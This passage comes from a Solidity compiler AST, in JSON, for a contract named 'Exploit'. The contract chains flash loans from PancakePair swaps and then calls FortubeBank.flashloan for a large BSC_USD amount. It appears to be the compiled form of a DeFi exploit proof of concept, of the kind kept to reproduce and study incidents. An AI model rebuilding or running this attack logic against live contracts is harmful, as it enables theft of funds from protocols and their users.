                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "2383:40:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "2366:57:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "falseBody": {
                    "id": 228,
                    "nodeType": "Block",
                    "src": "2541:110:0",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "commonType": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              },
                              "id": 215,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "leftExpression": {
                                "id": 213,
                                "name": "amount0",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 162,
                                "src": "2592:7:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              },
                              "nodeType": "BinaryOperation",
                              "operator": "-",
                              "rightExpression": {
                                "hexValue": "31",
                                "id": 214,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "kind": "number",
                                "lValueRequested": false,
                                "nodeType": "Literal",
                                "src": "2602:1:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_rational_1_by_1",
                                  "typeString": "int_const 1"
                                },
                                "value": "1"
                              },
                              "src": "2592:11:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            {
                              "hexValue": "30",
                              "id": 216,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "2605:1:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_0_by_1",
                                "typeString": "int_const 0"
                              },
                              "value": "0"
                            },
                            {
                              "arguments": [
                                {
                                  "id": 219,
                                  "name": "this",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": -28,
                                  "src": "2616:4:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_contract$_Exploit_$587",
                                    "typeString": "contract Exploit"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_contract$_Exploit_$587",
                                    "typeString": "contract Exploit"
                                  }
                                ],
                                "id": 218,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "2608:7:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_$",
                                  "typeString": "type(address)"
                                },
                                "typeName": {
                                  "id": 217,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "2608:7:0",
                                  "typeDescriptions": {}
                                }
                              },
                              "id": 220,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "2608:13:0",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            },
                            {
                              "arguments": [
                                {
                                  "hexValue": "30",
                                  "id": 223,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "kind": "number",
                                  "lValueRequested": false,
                                  "nodeType": "Literal",
                                  "src": "2634:1:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  },
                                  "value": "0"
                                },
                                {
                                  "hexValue": "30",
                                  "id": 224,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "kind": "number",
                                  "lValueRequested": false,
                                  "nodeType": "Literal",
                                  "src": "2637:1:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  },
                                  "value": "0"
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  },
                                  {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  }
                                ],
                                "expression": {
                                  "id": 221,
                                  "name": "abi",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": -1,
                                  "src": "2623:3:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_magic_abi",
                                    "typeString": "abi"
                                  }
                                },
                                "id": 222,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "memberName": "encode",
                                "nodeType": "MemberAccess",
                                "src": "2623:10:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
                                  "typeString": "function () pure returns (bytes memory)"
                                }
                              },
                              "id": 225,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "functionCall",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "2623:16:0",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_bytes_memory_ptr",
                                "typeString": "bytes memory"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              },
                              {
                                "typeIdentifier": "t_rational_0_by_1",
                                "typeString": "int_const 0"
                              },
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              },
                              {
                                "typeIdentifier": "t_bytes_memory_ptr",
                                "typeString": "bytes memory"
                              }
                            ],
                            "expression": {
                              "arguments": [
                                {
                                  "baseExpression": {
                                    "id": 208,
                                    "name": "flashloanPairs",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 54,
                                    "src": "2568:14:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_array$_t_address_$7_storage",
                                      "typeString": "address[7] storage ref"
                                    }
                                  },
                                  "id": 210,
                                  "indexExpression": {
                                    "hexValue": "30",
                                    "id": 209,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "2583:1:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_0_by_1",
                                      "typeString": "int_const 0"
                                    },
                                    "value": "0"
                                  },
                                  "isConstant": false,
                                  "isLValue": true,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "nodeType": "IndexAccess",
                                  "src": "2568:17:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  }
                                ],
                                "id": 207,
                                "name": "IPancakePair",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 869,
                                "src": "2555:12:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_contract$_IPancakePair_$869_$",
                                  "typeString": "type(contract IPancakePair)"
                                }
                              },
                              "id": 211,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "2555:31:0",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_IPancakePair_$869",
                                "typeString": "contract IPancakePair"
                              }
                            },
                            "id": 212,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "swap",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 853,
                            "src": "2555:36:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$_t_uint256_$_t_address_$_t_bytes_memory_ptr_$returns$__$",
                              "typeString": "function (uint256,uint256,address,bytes memory) external"
                            }
                          },
                          "id": 226,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2555:85:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 227,
                        "nodeType": "ExpressionStatement",
                        "src": "2555:85:0"
                      }
                    ]
                  },
                  "id": 229,
                  "nodeType": "IfStatement",
                  "src": "2362:289:0",
                  "trueBody": {
                    "id": 206,
                    "nodeType": "Block",
                    "src": "2424:111:0",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "30",
                              "id": 191,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "2476:1:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_0_by_1",
                                "typeString": "int_const 0"
                              },
                              "value": "0"
                            },
                            {
                              "commonType": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              },
                              "id": 194,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "leftExpression": {
                                "id": 192,
                                "name": "amount1",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 164,
                                "src": "2479:7:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              },
                              "nodeType": "BinaryOperation",
                              "operator": "-",
                              "rightExpression": {
                                "hexValue": "31",
                                "id": 193,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "kind": "number",
                                "lValueRequested": false,
                                "nodeType": "Literal",
                                "src": "2489:1:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_rational_1_by_1",
                                  "typeString": "int_const 1"
                                },
                                "value": "1"
                              },
                              "src": "2479:11:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            {
                              "arguments": [
                                {
                                  "id": 197,
                                  "name": "this",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": -28,
                                  "src": "2500:4:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_contract$_Exploit_$587",
                                    "typeString": "contract Exploit"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_contract$_Exploit_$587",
                                    "typeString": "contract Exploit"
                                  }
                                ],
                                "id": 196,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "2492:7:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_$",
                                  "typeString": "type(address)"
                                },
                                "typeName": {
                                  "id": 195,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "2492:7:0",
                                  "typeDescriptions": {}
                                }
                              },
                              "id": 198,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "2492:13:0",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            },
                            {
                              "arguments": [
                                {
                                  "hexValue": "30",
                                  "id": 201,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "kind": "number",
                                  "lValueRequested": false,
                                  "nodeType": "Literal",
                                  "src": "2518:1:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  },
                                  "value": "0"
                                },
                                {
                                  "hexValue": "31",
                                  "id": 202,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "kind": "number",
                                  "lValueRequested": false,
                                  "nodeType": "Literal",
                                  "src": "2521:1:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_rational_1_by_1",
                                    "typeString": "int_const 1"
                                  },
                                  "value": "1"
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  },
                                  {
                                    "typeIdentifier": "t_rational_1_by_1",
                                    "typeString": "int_const 1"
                                  }
                                ],
                                "expression": {
                                  "id": 199,
                                  "name": "abi",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": -1,
                                  "src": "2507:3:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_magic_abi",
                                    "typeString": "abi"
                                  }
                                },
                                "id": 200,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "memberName": "encode",
                                "nodeType": "MemberAccess",
                                "src": "2507:10:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
                                  "typeString": "function () pure returns (bytes memory)"
                                }
                              },
                              "id": 203,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "functionCall",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "2507:16:0",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_bytes_memory_ptr",
                                "typeString": "bytes memory"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_0_by_1",
                                "typeString": "int_const 0"
                              },
                              {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              },
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              },
                              {
                                "typeIdentifier": "t_bytes_memory_ptr",
                                "typeString": "bytes memory"
                              }
                            ],
                            "expression": {
                              "arguments": [
                                {
                                  "baseExpression": {
                                    "id": 186,
                                    "name": "flashloanPairs",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 54,
                                    "src": "2452:14:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_array$_t_address_$7_storage",
                                      "typeString": "address[7] storage ref"
                                    }
                                  },
                                  "id": 188,
                                  "indexExpression": {
                                    "hexValue": "30",
                                    "id": 187,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "2467:1:0",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_0_by_1",
                                      "typeString": "int_const 0"
                                    },
                                    "value": "0"
                                  },
                                  "isConstant": false,
                                  "isLValue": true,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "nodeType": "IndexAccess",
                                  "src": "2452:17:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  }
                                ],
                                "id": 185,
                                "name": "IPancakePair",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 869,
                                "src": "2439:12:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_contract$_IPancakePair_$869_$",
                                  "typeString": "type(contract IPancakePair)"
                                }
                              },
                              "id": 189,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "2439:31:0",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_IPancakePair_$869",
                                "typeString": "contract IPancakePair"
                              }
                            },
                            "id": 190,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "swap",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 853,
                            "src": "2439:36:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$_t_uint256_$_t_address_$_t_bytes_memory_ptr_$returns$__$",
                              "typeString": "function (uint256,uint256,address,bytes memory) external"
                            }
                          },
                          "id": 204,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2439:85:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 205,
                        "nodeType": "ExpressionStatement",
                        "src": "2439:85:0"
                      }
                    ]
                  }
                }
              ]
            },
            "functionSelector": "dffeadd0",
            "id": 231,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "main",
            "nameLocation": "2248:4:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 159,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2252:2:0"
            },
            "returnParameters": {
              "id": 160,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "2264:0:0"
            },
            "scope": 587,
            "src": "2239:566:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 394,
              "nodeType": "Block",
              "src": "2916:1039:0",
              "statements": [
                {
                  "assignments": [
                    null,
                    243
                  ],
                  "declarations": [
                    null,
                    {
                      "constant": false,
                      "id": 243,
                      "mutability": "mutable",
                      "name": "asset",
                      "nameLocation": "2934:5:0",
                      "nodeType": "VariableDeclaration",
                      "scope": 394,
                      "src": "2929:10:0",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 242,
                        "name": "uint",
                        "nodeType": "ElementaryTypeName",
                        "src": "2929:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 253,
                  "initialValue": {
                    "arguments": [
                      {
                        "id": 246,
                        "name": "_data",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 239,
                        "src": "2954:5:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bytes_calldata_ptr",
                          "typeString": "bytes calldata"
                        }
                      },
                      {
                        "components": [
                          {
                            "id": 248,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "2962:4:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_uint256_$",
                              "typeString": "type(uint256)"
                            },
                            "typeName": {
                              "id": 247,
                              "name": "uint",
                              "nodeType": "ElementaryTypeName",
                              "src": "2962:4:0",
                              "typeDescriptions": {}
                            }
                          },
                          {
                            "id": 250,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "ElementaryTypeNameExpression",
                            "src": "2968:4:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_uint256_$",
                              "typeString": "type(uint256)"
                            },
                            "typeName": {
                              "id": 249,
                              "name": "uint",
                              "nodeType": "ElementaryTypeName",
                              "src": "2968:4:0",
                              "typeDescriptions": {}
                            }
                          }
                        ],
                        "id": 251,
                        "isConstant": false,
                        "isInlineArray": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "TupleExpression",
                        "src": "2961:12:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_tuple$_t_type$_t_uint256_$_$_t_type$_t_uint256_$_$",
                          "typeString": "tuple(type(uint256),type(uint256))"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bytes_calldata_ptr",
                          "typeString": "bytes calldata"
                        },
                        {
                          "typeIdentifier": "t_tuple$_t_type$_t_uint256_$_$_t_type$_t_uint256_$_$",
                          "typeString": "tuple(type(uint256),type(uint256))"
                        }
                      ],
                      "expression": {
                        "id": 244,
                        "name": "abi",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": -1,
                        "src": "2943:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_abi",
                          "typeString": "abi"
                        }
                      },
                      "id": 245,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "lValueRequested": false,
                      "memberName": "decode",
                      "nodeType": "MemberAccess",
                      "src": "2943:10:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_abidecode_pure$__$returns$__$",
                        "typeString": "function () pure"
                      }
                    },
                    "id": 252,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2943:31:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$_t_uint256_$_t_uint256_$",
                      "typeString": "tuple(uint256,uint256)"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2926:48:0"
                },
                {
                  "expression": {
                    "id": 256,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 254,
                      "name": "step",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 6,
                      "src": "2984:4:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "+=",
                    "rightHandSide": {
                      "hexValue": "31",
                      "id": 255,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "2992:1:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_1_by_1",
                        "typeString": "int_const 1"
                      },
                      "value": "1"
                    },
                    "src": "2984:9:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 257,
                  "nodeType": "ExpressionStatement",
                  "src": "2984:9:0"
                },
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 260,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 258,
                      "name": "step",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 6,
                      "src": "3006:4:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "<",
                    "rightExpression": {
                      "hexValue": "37",
                      "id": 259,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "3013:1:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_7_by_1",
                        "typeString": "int_const 7"
                      },
                      "value": "7"
                    },
                    "src": "3006:8:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "falseBody": {
                    "id": 346,
                    "nodeType": "Block",
                    "src": "3511:160:0",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "arguments": [
                                {
                                  "id": 336,
                                  "name": "this",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": -28,
                                  "src": "3603:4:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_contract$_Exploit_$587",
                                    "typeString": "contract Exploit"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_contract$_Exploit_$587",
                                    "typeString": "contract Exploit"
                                  }
                                ],
                                "id": 335,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "3595:7:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_$",
                                  "typeString": "type(address)"
                                },
                                "typeName": {
                                  "id": 334,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "3595:7:0",
                                  "typeDescriptions": {}
                                }
                              },
                              "id": 337,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "3595:13:0",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            },
                            {
                              "arguments": [
                                {
                                  "id": 340,
                                  "name": "BSC_USD",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 18,
                                  "src": "3618:7:0",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_contract$_IERC20_$629",
                                    "typeString": "contract IERC20"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_contract$_IERC20_$629",
                                    "typeString": "contract IERC20"
                                  }
                                ],
                                "id": 339,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "3610:7:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_$",
                                  "typeString": "type(address)"
                                },
                                "typeName": {
                                  "id": 338,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "3610:7:0",
                                  "typeDescriptions": {}
                                }
                              },
                              "id": 341,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "3610:16:0",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            },
                            {
                              "hexValue": "32393631373530343530393837303236333639333636363631",
                              "id": 342,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "3628:25:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_2961750450987026369366661_by_1",
                                "typeString": "int_const 2961750450987026369366661"
                              },
                              "value": "2961750450987026369366661"
                            },
                            {
                              "hexValue": "3078",
                              "id": 343,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "string",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "3655:4:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_stringliteral_39bef1777deb3dfb14f64b9f81ced092c501fee72f90e93d03bb95ee89df9837",
                                "typeString": "literal_string \"0x\""
                              },
                              "value": "0x"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              },
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              },
                              {
                                "typeIdentifier": "t_rational_2961750450987026369366661_by_1",
                                "typeString": "int_const 2961750450987026369366661"
                              },
                              {
                                "typeIdentifier": "t_stringliteral_39bef1777deb3dfb14f64b9f81ced092c501fee72f90e93d03bb95ee89df9837",
                                "typeString": "literal_string \"0x\""
                              }
                            ],
                            "expression": {
                              "id": 331,
                              "name": "FortubeBank",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 60,
                              "src": "3573:11:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_IFortubeBank_$1379",
                                "typeString": "contract IFortubeBank"
                              }
                            },
                            "id": 333,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "flashloan",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 1364,
                            "src": "3573:21:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_bytes_memory_ptr_$returns$__$",
                              "typeString": "function (address,address,uint256,bytes memory) external"
                            }
                          },
                          "id": 344,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "3573:87:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 345,
                        "nodeType": "ExpressionStatement",
                        "src": "3573:87:0"
                      }
                    ]
                  },
                  "id": 347,
                  "nodeType": "IfStatement",
                  "src": "3003:668:0",
                  "trueBody": {
                    "id": 330,
                    "nodeType": "Block",
                    "src": "3015:490:0",
                    "statements": [
                      {
                        "assignments": [
                          262,
                          264,
                          null
                        ],
                        "declarations": [
                          {
                            "constant": false,
                            "id": 262,
                            "mutability": "mutable",
                            "name": "amount0",
                            "nameLocation": "3035:7:0",
                            "nodeType": "VariableDeclaration",
                            "scope": 330,
                            "src": "3030:12:0",
                            "stateVariable": false,
                            "storageLocation": "default",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            },
                            "typeName": {
                              "id": 261,
                              "name": "uint",
                              "nodeType": "ElementaryTypeName",
                              "src": "3030:4:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "visibility": "internal"
                          },
                          {
                            "constant": false,
                            "id": 264,
                            "mutability": "mutable",
